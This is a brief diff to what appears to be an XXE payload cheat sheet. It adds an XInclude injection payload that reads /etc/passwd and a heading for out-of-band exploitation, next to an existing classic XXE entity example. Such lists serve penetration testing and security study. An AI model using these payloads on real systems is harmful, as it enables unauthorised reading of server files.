@@ -42,6 +42,11 @@ Classic XXE
 ]>
 <example>&test;</example>
 
+Exploiting xxe via Xinclude
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+Out of Band exploitation
+
 Outbound XXE
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE example [
